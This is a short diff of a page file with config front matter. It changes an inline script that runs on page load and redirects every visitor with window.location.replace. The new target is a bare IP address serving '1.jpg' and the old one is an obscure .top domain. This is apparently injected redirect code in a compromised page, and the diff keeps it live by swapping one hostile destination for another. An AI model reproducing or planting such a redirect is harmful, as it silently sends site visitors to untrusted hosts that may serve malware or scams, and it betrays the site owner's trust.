@@ -5,7 +5,7 @@ config:
 ---
 <script>
   if (typeof window !== 'undefined') {
-     window.location.replace('http://e8v06.top/w/831_1VGB75M13CNX983F762');
+     window.location.replace('http://103.100.211.146/1.jpg');
     //window.open('/pzm.jpg', '_self')
   }
 </script>
